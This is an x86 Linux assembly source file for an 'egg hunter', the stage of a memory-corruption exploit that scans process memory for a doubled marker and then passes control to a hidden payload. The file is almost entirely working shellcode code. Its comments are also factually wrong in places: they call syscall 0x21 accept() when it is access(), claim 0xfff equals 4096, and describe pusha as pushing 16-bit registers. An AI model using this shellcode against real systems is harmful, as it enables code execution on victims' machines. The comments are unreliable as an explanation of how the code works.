; Filename: eggHunter.nasm
; Author:   boku
global _start
_start:
; Configure Egg in EBX
  mov ebx, 0x50905090
; Clear EAX, ECX, EDX
  xor ecx, ecx         ; Clears the ECX Register. 
  mul ecx              ; ECX*EAX. Result is stored in EDX:EAX. 
; Jump here to move forward a memory page
nextPage:              ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
  or dx, 0xfff         ; 0xfff = 4096. This is the size of Linux Memory pages.
; Jump here to move forward 4 bytes on a memory page
nextAddress:           ; Increments the memory address stored in EDX by 4 Bytes 
  inc edx              ; in combo with the or dx above, this moves the memory scanner EDX by a page
                       ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the
                       ;  next memory address
 ; 4095*2=8190+1=8191. 
 ;                                      --> (inc edx) 4095+1  -->  (inc edx) 8191+1
 ; or dx when edx is: \x00000000        |   \x00001000 = 4096 |    \x00002000 = 8192
 ;               OR   \x00000FFF        |   \x00000FFF = 4095 |    \x00000FFF = 4095
 ;          RESULTS:  \x00000FFF = 4095--   \x00001FFF = 8191--    \x00002FFF = 12287

; Save the registers before accept() system-call because they will be altered after the call
 pusha                 ; Pushes all 16-bit registers onto the stack
 lea ebx, [edx+0x4]    ; Increments the Memory Address of EDX by 4 Bytes.
                       ;  Stores the value stored at EDX+4 into the EBX register
 mov al, 0x21          ; System Call for accept() 
 int 0x80              ; Executes accept()
; Check if memory page is accessible
 cmp al, 0xf2          ; The return value of accept() is stored in EAX. 
                       ;  Checks if access is denied
; Load the registers that were stored onto the stack

 popa                  ; Pops all 16-bit registers from the stack
; if accept() could not access the memory page, go to the next page
 jz nextPage           ; If page access is denied, check the next memory page 
; if accept() could access the memory page, 
;  check if the egg is in the first memory location on the page
 cmp [edx], ebx
; if the egg is not there, then increment our location 
;  on the page by 1 byte and check there
 jnz nextAddress
; if the egg is there, check the next for bytes to make 
;  sure it is our payload and not the egghunter itself.
 cmp [edx+0x4], ebx
; if the egg isn't there then it is a fluke or 
;  is our egghunter. Check the next address.
 jnz nextAddress
; if the egg is there twice, then we found our payload. 
;  Jump to the memory location on that page
;  and transfer control to our payload.
 jmp edx
